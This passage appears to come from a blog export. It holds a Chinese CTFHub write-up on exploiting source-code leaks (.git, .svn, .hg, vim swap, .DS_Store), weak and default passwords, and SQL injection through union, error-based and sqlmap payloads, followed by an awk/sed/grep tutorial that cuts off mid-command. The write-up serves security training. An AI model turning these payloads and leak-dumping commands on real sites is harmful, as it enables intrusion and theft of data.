Vim缓存\n\n>在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容\n>以 index.php 为例：第一次产生的交换文件名为 `.index.php.swp`\n>再次意外退出后，将会产生名为 `.index.php.swo` 的交换文件\n>第三次产生的交换文件则为 `.index.php.swn`\n\n```\ncurl http://challenge-c86ab07eaf0058b1.sandbox.ctfhub.com:10080/.index.php.swp\n```\n\n#### .DS_Store\n\n> .DS_Store(英文全称 Desktop Services Store)是一种由苹果公司的Mac OS X操作系统所创造的隐藏文件，目的在于存贮目录的自定义属性，例如文件们的图标位置或者是背景色的选择。相当于 Windows 下的 desktop.ini。\n\n**方法一--用curl直接查看**\n\n```\ncurl http://challenge-c86ab07eaf0058b1.sandbox.ctfhub.com:10080/.DS_Store --output a.txt\n```\n\n查看a.txt发现有个3ca5353db1943cc0e1e108d40d5fbb99.txt，查看该txt得到flag\n\n**方法二--利用工具解析**\n\n详情看我另外一篇文章：[.DS_Store文件泄漏利用脚本](https://www.jianshu.com/p/8de8930425c9)\n\n### Git泄露\n\n> 当前大量开发人员使用`git`进行版本控制，对站点自动部署。如果配置不当,可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。工具：[GitHack](https://github.com/BugScanTeam/GitHack)\n\n```bash\nGit常见的利用：\n①.git/index中会缓存git add的文件，这里在没有commit的情况下，也是存在的\n②.git/refs/heads/master 记录了master的commit的hash，由此可以解析出这个commit的所有文件\n③.git/logs/HEAD其中存储了git的log信息，可以找到历史的commit项\n④.git/refs/stash 工作进度的临时保存\n⑤.git/info/packs packs文件提取恢复\n```\n\n#### Log\n\n1.使用dirsearch工具扫描网站目录，发现git泄露.git/logs/HEAD，在git中是存储历史记录的\n\n```bash\npython3 dirsearch.py -u \"http://challenge-89c367ed8802f5e5.sandbox.ctfhub.com:10080\" -e *\n```\n\n2.使用GitHack工具克隆目标源代码到本地\n\n```bash\npython GitHack.py http://challenge-89c367ed8802f5e5.sandbox.ctfhub.com:10080/.git/\n```\n\n3.执行`git log`查看commit历史记录  可以看到当前版本是remove flag，我们要的flag在add flag中\n\n![](https://img.jwt1399.top//img/20200716180358.png)\n\n4.方法1：使用`git diff`直接与 `add flag (e2f0)` 这次提交进行差异比对\n\n![](https://img.jwt1399.top//img/20200716180418.png)\n\n5.方法2：使用`git reset --hard <file>`直接切换到 `add flag (e2f0)` 这个版本\n\n![](https://img.jwt1399.top//img/20200716180403.png)\n\n#### Stash\n\n> Stash：能够将所有未提交的修改（工作区和暂存区）保存至堆栈中，用于后续恢复当前工作目录。\n\n1.使用dirsearch扫描网站目录，发现git泄露`.git/refs/stash` ，在git中是暂存区的意思\n\n```bash\npython3 dirsearch.py -u \"http://challenge-ba5511373d69c409.sandbox.ctfhub.com:10080/\" -e *\n```\n\n2.使用GitHack克隆目标源代码到本地\n\n```bash\npython GitHack.py http://challenge-ba5511373d69c409.sandbox.ctfhub.com:10080//.git/\n```\n\n3.方法一：使用`git stash list` 显示保存进度的列表，发现有 stash\n\n![](https://img.jwt1399.top//img/20200716180428.png)\n\n使用`git stash pop` 恢复最新的进度到工作区，这个文件的内容就是 flag\n\n![](https://img.jwt1399.top//img/20200716180431.png)\n\n4.方法二：查看 `.git/refs/stash` 找到 `stash` 对应的 `hash`，使用`git diff b59e90` 即可看到 flag\n\n![](https://img.jwt1399.top//img/20200716180458.png)\n\n#### Index\n\n还是先使用GitHack克隆目标源代码到本地，因为题目是index，所以考虑git的index暂存区文件，打开克隆好的文件夹发现flag\n\n### SVN泄露\n\n> 当开发人员使用 `SVN` 进行版本控制，对站点自动部署。如果配置不当,可能会将.svn文件夹直接部署到线上环境。这就引起了 SVN 泄露漏洞。工具：[dvcs-ripper](https://github.com/kost/dvcs-ripper)\n\n1.使用`dirsearch`扫描发现有 `.svn/` 目录，确认是 `.svn` 泄露。\n\n```bash\npython3 dirsearch.py -u \"http://challenge-8df627014df49067.san dbox.ctfhub.com:10080/\" -e *\n```\n\n2.使用 `dvcs-ripper` 工具中的 `rip-svn.pl` 脚本进行 clone.\n\n```bash\ncd dvcs-ripper\n\nperl rip-svn.pl -v -u http://challenge-8df627014df49067.sandbox.ctfhub.com:10080/.svn/\n```\n\n![](https://img.jwt1399.top//img/20200716193721.png)\n\n3.进入`.svn/pristine/`文件夹下， 在`bf`文件夹下发现`xxx.svn-base`源码文件，查看得到flag\n\n![](https://img.jwt1399.top//img/20200716193224.png)\n\n### HG泄露\n\n> 当开发人员使用 `Mercurial` 进行版本控制，对站点自动部署。如果配置不当,可能会将.hg 文件夹直接部署到线上环境。这就引起了 hg 泄露漏洞。[dvcs-ripper](https://github.com/kost/dvcs-ripper)\n\n1.使用`dirsearch`扫描发现有 `.hg/` 目录，确认是 `.hg` 泄露。\n\n```bash\npython3 dirsearch.py -u \"http://challenge-a6460a92a6b0ee37.sandbox.ctfhub.com:10080/\" -e *\n```\n\n2.使用 `dvcs-ripper` 工具中的 `rip-svn.pl` 脚本进行 clone.\n\n```\ncd dvcs-ripper\n\nperl rip-hg.pl -v -u http://challenge-a6460a92a6b0ee37.sandbox.ctfhub.com:10080/.hg/\n```\n\n3.查看`.hg/store/fncache`，得到flag 的文件名为`flag_849825983.txt`，直接访问即可得 flag\n\n```bash\ncat .hg/store/fncache\n```\n\n![](https://img.jwt1399.top//img/20200716195910.png)\n\n```bash\ncurl http://challenge-a6460a92a6b0ee37.sandbox.ctfhub.com:10080/flag_849825983.txt\n或者\ncurl http://challenge-a6460a92a6b0ee37.sandbox.ctfhub.com:10080/.hg/store/data/flag_849825983.txt.i\n```\n\n![](https://img.jwt1399.top//img/20200716195914.png)\n\n参考：[常见Web源码泄露总结](https://www.secpulse.com/archives/55286.html)\n\n## 密码口令\n\n### 弱口令\n\n> 通常认为容易被别人（他们有可能对你很了解）猜测到或被破解工具破解的口令均为弱口令。\n\n打开链接是一个后台登录页面，直接Burp抓包，猜测用户名为admin,使用Intruder模块进行密码爆破，得到密码为password，登录即可得到flag\n\n### 默认口令\n\n打开页面后，发现是亿邮邮件网关，经百度查询[亿邮邮件网关系统默认口令](https://www.uedbox.com/post/23317/)，直接查到账户和密码，登录即可得到flag\n\n## SQL注入\n\n### 整数型注入\n\n```sql\n#查看页面变化，判断sql注入类别【为数字型注入】\n1\n\n#确定字段数【字段数为2】\n1 order by  1\n1 order by  2\n1 order by  3\n\n#确定字段顺序\n1 union select 1,2\n\n#爆数据库名【sqli】\n-1 union select 1,database()\n\n#爆表名【news,flag】\n-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema='sqli'\n\n#爆列名【flag】\n-1 union select 1,group_concat(column_name) from information_schema.columns where table_name='flag'\n\n#爆值\n-1 union select 1,flag from flag\n```\n\n![](https://img.jwt1399.top//img/20200718144309.png)\n\n### 字符型注入\n\n```sql\n#查看页面变化，判断sql注入类别【为字符型注入】\n1\n\n#确定字段数【字段数为2】\n1' order by  1 #\n1' order by  2 #\n1' order by  3 #\n\n#确定字段顺序\n-1' union select 1,2 #\n\n#爆数据库名【sqli】\n-1' union select 1,database() #\n或者将#改为--空格\n\n\n#爆表名【news,flag】\n-1' union select 1,group_concat(table_name) from information_schema.tables where table_schema='sqli' #\n\n\n#爆列名【flag】\n-1' union select 1,group_concat(column_name) from information_schema.columns where table_name='flag' #\n\n#爆值\n-1' union select 1,flag from flag #\n```\n\n### 报错注入\n\n```sql\n#查看页面变化，判断sql注入类别【为数字型注入】\n1\n#确定字段数【字段数为2】\n\n1 order by 1\n1 order by 2\n1 order by 3 报错\n\n#获取数据库名【Duplicate entry 'sqli-1' for key 'group_key'】注意：有可能要多查几次才能成功\n-1 union select count(*),concat_ws('-',(select database()),floor(rand()*2))as a from information_schema.tables group by a\n\n#获取表名【 Duplicate entry 'flag-1' for key 'group_key'】\n-1 union select count(*),concat_ws('-',(select table_name from information_schema.tables where table_schema='sqli' limit 1,1),floor(rand()*2))as a from information_schema.tables group by a\n#因为Subquery returns more than 1 row，所以用limit来控制输出,连接函数也不管用\n\n-1 union select count(*),concat_ws('-',(select concat(table_name) from information_schema.tables where table_schema='sqli'),floor(rand()*2))as a from information_schema.tables group by a\n\n#获取列名【Duplicate entry 'flag-0' for key 'group_key'】\n-1 union select count(*),concat_ws('-',(select column_name from information_schema.columns where table_name='flag'limit 0,1),floor(rand()*2))as a from information_schema.tables group by a\n\n#爆值【Duplicate entry 'ctfhub{64d51cbcc3eb2513447c46282c921601c14da36b}-1' for key 'group_key'】\n-1 union select count(*),concat_ws('-',(select flag from flag limit 0,1),floor(rand()*2))as a from information_schema.tables group by a\n\n```\n\n![image-20200718201155785](../images/CTFHub-%E6%8A%80%E8%83%BD%E6%A0%91-Web/image-20200718201155785.png)\n\n### 布尔盲注\n\n直接使用sqlmap工具跑\n\n```\n--batch: 用此参数，不需要用户输入，将会使用sqlmap提示的默认值一直运行下去。\n--technique:选择注入技术，B、T、E、U、S\n--threads 10 :设置线程为10，运行速度会更快\n--dbms:不仅可以指定数据库类型，还可以指定数据库版本\n```\n\n```bash\n#查询数据库 #【sqli】\npython sqlmap.py -u http://challenge-0107480d29208db9.sandbox.ctfhub.com:10080/?id=1 --technique T --dbs --batch --threads 10 --dbms=mysql\n\n#获取数据库中的表 #【flag】\npython sqlmap.py  -u http://challenge-0107480d29208db9.sandbox.ctfhub.com:10080/?id=1 --technique T -D sqli  --tables --batch --threads 10 --dbms=mysql\n\n#获取表中的字段名 #【flag】\npython sqlmap.py -u http://challenge-0107480d29208db9.sandbox.ctfhub.com:10080/?id=1 --technique T -D sqli -T flag --columns --batch --threads 10 --dbms=mysql\n\n#获取字段信息 \npython sqlmap.py -u http://challenge-0107480d29208db9.sandbox.ctfhub.com:10080/?id=1 --technique T -D sqli -T flag -C flag --dump --batch --threads 10 --dbms=mysql\n\n#--technique使用参数B跑不出来，改成T才跑出来\n```\n\n\n\n### 时间盲注\n\n\n\n## 赞助💰\n\n如果你觉得对你有帮助，你可以请我喝一杯冰可乐！嘻嘻🤭\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝支付</td>\n         <td style=\"text-align:center;\">微信支付</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/wechat.png\"></td>     \n  </tr>\n</tbody></table>\n\n\n```\n\n```","tags":["Write-up"],"categories":["CTF"]},{"title":"Linux文本处理三剑客","url":"/posts/22718.html","content":"\nawk、sed、grep是linux操作文本的三大利器，合称文本三剑客，也是必须掌握的linux命令之一。三者的功能都是处理文本，但侧重点各不相同，grep更适合单纯的查找或匹配文本，sed更适合编辑匹配到的文本，awk更适合格式化文本，对文本进行较复杂格式处理。\n\n## awk🍉\n\n### awk简介\n\n◆名字来源于三个作者的名字简称\n◆适用于需要按列处理的数据，主要用于文本内容的分析处理，也常用于处理数据，生成报告\n\n### awk基本用法\n\n#### 1、打印对应列\n\n`ifconfig | awk '{print $1,$2,$3}'`  获取1、2、3列的内容，默认每列按空格或者TAB键分割。\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image002-1591679078851.jpg)\n\n#### 2、-F 参数\n\n`cat /etc/shadow | awk -F: '{print $1}'`   指定 `：`为分隔字符来获取该文件的第1列的列值。\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image004-1591679078852.jpg)\n\n`awk 'BEGIN{FS=\":\"}{print $1}' test.txt`   内建变量，指定 ：为分隔字符。\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image006-1591679078853.jpg)\n\n`awk -F'[ :]' '{print $1}' test.txt`  使用多个分割符，在[]内有一个空格和 : 字符，先使用空格作为分隔符，然后对分割结果再使用:进行分割。\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image008-1591679078853.jpg)\n\n####  3、-v 参数\n\n`awk -vb=3 '{print $1,$b}' test.txt`  设置变量，即可以任意给定变量的值，在选择要输出的列的值就可以设置为这个变量。\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image010-1591679078853.jpg)\n\n`awk -vx=2 -vy=fl '{print $1,$x,$1y}' test.txt` 除设置数字型变量以外，还能够在某一列的列值末尾添加字符。\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image012-1591679078853.jpg)\n\n####  4、-f 参数\n\n`awk -f fl.awk test.txt`  使用文件中的awk参数来获取信息。\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image014-1591679078853.jpg)\n\n####  5、运算符\n\n`awk '$1>3' test.txt`  列出第一列值大于3的行。\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image016-1591679078853.jpg)\n\n `awk '$1==3' test.txt`   显示第一列值等于3的行。\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image018-1591679078853.jpg)\n\n \n\n`awk '$1==3 {print $1,$3}’ test.txt`   显示第一列值等于3的所在行的第一列和第三列的值。\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image020-1591679078853.jpg)\n\n \n\n`awk '$1>3 && $4==\"aaaaaa\" {print $1,$2,$3,$4}' test.txt`   显示第一列大于3且第四列的列值等于“aaaaaa”的所在行的第1,2,3,4列的列值。\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image022-1591679078853.jpg)\n\n#### 6、打印抬头文\n\n`awk -F:   'BEGIN {print \"---------fulin_test-----------\"} {print $1}' test.txt` \n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image030-1591679500766.jpg)\n\n## sed🍓\n\n### sed简介\n\n◆stream editor\n◆根据定位到的数据行修改数据，主要用于文本内容的编辑，默认只处理模式空间，不改变原数据\n\n### sed基本用法\n\n#### 1、-n 参数\n\n#####  **1.1** **显示单行**\n\n`sed -n '4p' test.txt` 显示文件的第4行。\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image002-1591679500761.jpg)\n\n#####  **1.2** **显示行范围**\n\n`sed -n '3,6p' test.txt` 显示文件的3至6行。\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image004-1591679500762.jpg)\n\n#####  **1.3** **显示关键字所在行**\n\n`sed -n '/aaaa/'p test.txt` 显示包含关键字的所有行。\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image006-1591679500763.jpg)\n\n#####  1.4 显示整个文件\n\n`sed -n '1,$p' test.txt`  显示整个文件，其中$p代表最后一行。\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image008-1591679500764.jpg)\n\n`sed -n '/\\$/'p test.txt` 由于$本身对sed代表一种含意（表示最后一行）,而若需要过滤文档本身$字符，要让$字符失去意义就要将用\\$表示$字符本身.\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image010-1591679500764.jpg)\n\n#####  **1.5** **正则表达式**\n\n `sed -n '/.*fl/'p test.txt` 使用正则表达式：’. ‘ ‘*’ ‘ .*fl’等。\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image012-1591679500765.jpg)\n\n#### 2、模式/pattern/= 显示行号\n\n`sed '/fl/=' test.txt` 使用模式/pattern/=显示文件所有内容及关键字所在行的行号。\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image014-1591679500765.jpg)\n\n`sed -n '/fl/=' test.txt`在模式/pattern/=的基础上添加-n参数表示仅显示关键字所在行的行号。\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image016-1591679500766.jpg)\n\n#### 3、-e参数\n\n`sed -n -e'/aaaaaa/=' -e '/fl/=' -e'/abs/=' test.txt` -e参数能够支持多个模式/pattern/=。\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image018-1591679500766.jpg)\n\n`sed -n -e'/ssaa/'p -e'/bkha/'p test.txt` -e参数也能够支持多个’/pattern/’p模式。\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image020-1591679500766.jpg)\n\n#### 4、替换匹配行的关键字\n\n`sed '2s/a/A/g' test.txt` 将文件的第2行的所有 a 字符全部替换为A字符。（2s代表第二行、/a/A/匹配第2行的a字符并将a替换为A，g代表的是全局）。\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image022-1591679500766.jpg)\n\n但是这种关键字的替换`并不会修改源文件`，仅是在命令执行后临时性的显示一次。\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image024-1591679500766.jpg)\n\n#### 5、-i参数\n\n `sed -i '4s/a/A/g' test.txt`   **-i** 直接修改文件内容 ,替换修改会保存到源文件中。  4s指的是进行第四行替换， g代指的全局替换 将a替换成A。并保存文件。\n\n \n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image026-1591679500766.jpg)\n\n \n\n#### 6、-i.bak参数\n\n`sed -i.bak '4d' test.txt` 删除源文件的第4行，并且备份一份未被修改的源文件‘.bak’。\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image028-1591679500766.jpg)\n\n#### 7、sed应用实例\n\n##### 7.1 实用性：达到取任何一个字符\n\n`ifconfig | sed -n '2p' |awk -F: '{print $2}'|awk '{print $1}'|awk -F. '{print $2}'|awk -F1 '{print $2}'|awk -F8 '{print $1}'`\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image032-1591679500766.jpg)\n\n#####  7.2 截取linux所有网卡及网卡的MAC地址\n\n`ifconfig | sed -n -e '1p' -e '10p' |awk '{print $1,\"\\t|\\t\"$5}'`\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image034-1591679500766.jpg)\n\n \n\n#####  7.3 截取linux所有网卡的IP地址及其子网掩码\n\n`ifconfig | sed -n -e'2p' -e'11p' | awk '{print $2}'|awk -F: '{print $2}'|grep -v '^$'`\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image036-1591679500767.jpg)\n\n## grep🍒\n\n### grep简介\n\n◆global  regular expression print \n◆基于正则表达式查找满足条件的行，主要用于文本内容查找，支持正则表达式\n\n### grep基本用法\n\n#### 1、 在文件中查找关键字\n\n `grep \"fl\" /etc/passwd` 搜索关键字并打印出关键字所在的行。\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image002.jpg)\n\n##### 1.1  -A 参数\n\n`grep -A 10 \"fl\" /etc/passwd` 搜索关键字并打印出关键字所在的行以及关键字以下十行。\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image004.jpg)\n\n##### 1.2  -B 参数\n\n `grep -B 10 \"fl\" /etc/passwd` 搜索关键字并打印出关键字所在的行以及关键字以上十行。\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image006.jpg)\n\n##### 1.3  -C 参数\n\n`grep -C 10 \"fl\" /etc/passwd` 搜索关键字并打印出关键字所在的行以及关键字以上下十行。\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image008.jpg)\n\n#### 2、 在多个文件中查找模式\n\n`grep \"fl\" /etc/passwd /etc/shadow /etc/group /etc/gshadow` \n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image010.jpg)\n\n#### 3、-l 参数\n\n**作用：列出包含关键字的文件名**\n\n`grep -l \"fl\" /etc/passwd test.txt a.txt /etc/shadow /etc/group /etc/gshadow` \n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image012.jpg)\n\n#### 4、-n 参数\n\n**作用：列出关键字所在的行号及行的内容**\n\n`grep -n \"fl\" /etc/passwd` \n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image014.jpg)\n\n#### 5、-v  参数\n\n**作用：打印出不包含关键字所有的行**\n\n`grep -v \"defaults\" /etc/fstab` \n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image016.jpg)\n\n#### 6、 ^  符号\n\n**作用：输出以某个关键字开头的所有行**\n\n`grep \"^UUID\" /etc/fstab`\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image018.jpg)\n\n#### 7、 $ 符号\n\n**作用：输出以某个关键字结尾的所有行**\n\n`grep \"bash$\" /etc/passwd`\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image020.jpg)\n\n**过滤注释和空行**： `grep -v \"#\"  test.txt |grep -v \"^$\"`  其中 \"^$\" 代表空行\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image022.jpg)\n\n#### 8、-r 参数\n\n**作用：递归查找**\n\n`grep -r -n \"aaaaaa\" .` 能把一个目录中只要是包含关键字的所有文件及所在的行的行号都打印出来。\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image024.jpg)\n\n#### 9、-i 参数\n\n**作用：忽略大小写**\n\n`grep -r -i \"aaaaaa\" .`\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image026.jpg)\n\n#### 10、-e 参数\n\n**作用：多关键字查找**\n\n`grep -e \"aaaaa\" -e \"bbbb\" test.txt`\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image028.jpg)\n\n查看文件中生效的配置：`grep -v -e \"#\" -e \"^$\" test.txt`\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image030.jpg)\n\n#### 11、-f 参数\n\n**作用：以指定的文件里面的匹配模式去搜索**\n\n`grep -f tmp.txt /etc/passwd`\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image032.jpg)\n\n#### 12、-c 参数\n\n**作用：显示匹配关键字的行数**\n\n`grep -c \"aaaaa\" test.txt`\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image034.jpg)\n\n \n\n### grep结合正则表达式\n\n####  1、^\n\n**作用：**锚定行首\n\n `grep ^fl /etc/passwd`\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image036.jpg)\n\n####  2、$\n\n**作用：**锚定行尾\n\n`grep bash$ /etc/passwd`\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image038.jpg)\n\n####  3、.\n\n**作用：**匹配为非换行符的任意字符\n\n`grep \"f....l\" test.txt`  当`.字符`位于两个指定指定的关键字的中间时，一个 `. 字符`匹配为一个非换行符的任意字符。 \n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image040.jpg)\n\n`grep \"f.\" test.txt`  当 `.字符`位于末尾时则匹配为任意多个非换行符的字符。\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image042.jpg)\n\n####  4、\\\n\n**作用：**匹配零个或多个先前字符\n\n`grep \"fu*\" test.txt` 列出匹配0个或多个关键字所在行。\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image044.jpg)\n\n####  5、[]\n\n**作用：**匹配一个指定范围内的字符\n\n`grep [ahb] test.txt`  列出含有指定范围内的1个或多个关键字的所在行。\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image046.jpg)\n\n####  6、[^]\n\n**作用：**匹配不在指定范围内的字符\n\n`grep [^fabc] test.txt` 列出除了所有字符都是指定范围内的1个或多个关键字的所在行。\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image048.jpg)\n\n####  7、过滤有数字的行\n\n`grep -v [0-9] test.txt`\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image050.jpg)\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image051.jpg)\n\n####  8、打印出有数字的行\n\n`grep [0-9] 